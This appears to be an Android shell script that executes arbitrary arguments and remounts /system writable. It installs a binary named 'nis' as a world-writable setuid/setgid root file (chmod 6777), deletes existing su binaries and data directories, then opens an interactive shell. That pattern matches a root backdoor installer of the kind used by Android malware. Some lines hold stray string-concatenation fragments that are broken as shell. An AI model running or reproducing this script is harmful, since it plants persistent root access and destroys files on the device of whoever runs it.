#!/system/bin/sh

eval $@

mount -o remount,rw /system
mount -o remount rw /system

cat $PWD/nis > /system/bin/nis
chown 0.0 /system/bin/nis
chmod 6777 /system/bin/nis
rm /system/bin/.usr/.ku
rm -r /system/bin/.usr
rm /system/bin/su
rm /system/xbin/su
rm -r /data/data-lib/*
rm -r " + $PWD/ + ".*
rm " + $PWD/ + "kd

exec /system/bin/sh -i
